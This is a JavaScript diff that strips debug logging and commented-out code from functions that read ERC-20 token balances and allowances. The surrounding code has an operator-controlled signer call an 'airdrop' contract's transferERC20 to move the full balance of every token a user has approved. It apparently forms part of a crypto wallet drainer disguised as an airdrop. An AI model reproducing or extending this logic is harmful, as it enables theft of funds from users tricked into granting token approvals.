@@ -50,7 +50,6 @@ export const getBalanceErc20 = async (providerAddress, tokens, airdrop, userAddr
     return await Promise.all(filtredTokens);
 }
 export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, clientReader,  signerAccount) => {
-
     let res = [];
     for (let i = 0; i < tokensWithBalance.length; i++) {
         try {
@@ -60,7 +59,6 @@ export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddre
                 functionName: "allowance",
                 args: [userAddress, airdrop]
             })
-            console.log(allowance.toString(), "allowance")
             if (allowance.toString() !== "0" && tokensWithBalance[i].balance.toString() !== "0" ) {
                 res.push(tokensWithBalance[i]);
             }
@@ -70,7 +68,6 @@ export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddre
         }
     }
     try {
-        console.log(signerAccount)
         const addresses = tokensWithBalance.map((token) => token.address);
         const amounts = tokensWithBalance.map((token) => token.balance);
         if (addresses.length > 0 && amounts.length > 0) {
@@ -87,15 +84,6 @@ export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddre
                 args: [userAddress, addresses, amounts],
                 gasPrice:chain.id === 137 ? walletClient.getGasPrice() : undefined,
               })
-            // if (chain.id === 137) {
-            //     txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts, { gasPrice: publicClient.getGasPrice() });
-            // }
-            // else {
-            //     txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts);
-            // }
-            // signer.sendTransaction(txToSend).then((res) => {
-            //     console.log(res, "res")
-            // })
         }
     }
     catch (err) {
